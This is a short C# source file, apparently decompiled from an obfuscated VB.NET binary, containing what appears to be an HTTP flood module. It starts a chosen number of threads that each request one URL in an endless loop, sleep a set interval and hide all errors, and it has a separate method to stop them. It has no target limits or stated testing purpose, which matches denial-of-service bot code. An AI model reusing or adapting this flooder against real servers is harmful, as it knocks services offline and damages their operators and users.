using System;
using System.Net;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

internal sealed class Class9
{
	private sealed class Class10
	{
		private string string_0;

		private WebClient webClient_0;

		private int int_0;

		public Class10(string string_1, int int_1)
		{
			webClient_0 = new WebClient();
			string_0 = string_1;
			int_0 = int_1;
		}

		public void method_0()
		{
			while (true)
			{
				try
				{
					webClient_0.DownloadString(string_0);
					Thread.Sleep(int_0);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					Thread.Sleep(int_0);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private static ThreadStart[] threadStart_0;

	private static Thread[] thread_0;

	public static string string_0;

	public static int int_0;

	public static bool bool_0;

	private static Class10[] class10_0;

	public static int int_1;

	public static void smethod_0()
	{
		checked
		{
			thread_0 = new Thread[int_1 - 1 + 1];
			threadStart_0 = new ThreadStart[int_1 - 1 + 1];
			class10_0 = new Class10[int_1 - 1 + 1];
			int num = int_1 - 1;
			for (int i = 0; i <= num; i++)
			{
				class10_0[i] = new Class10(string_0, int_0);
				threadStart_0[i] = class10_0[i].method_0;
				thread_0[i] = new Thread(threadStart_0[i]);
				thread_0[i].Start();
			}
			bool_0 = true;
		}
	}

	public static void smethod_1()
	{
		checked
		{
			int num = int_1 - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					thread_0[i].Abort();
					thread_0[i] = null;
					threadStart_0[i] = null;
					class10_0[i] = null;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			bool_0 = false;
		}
	}
}
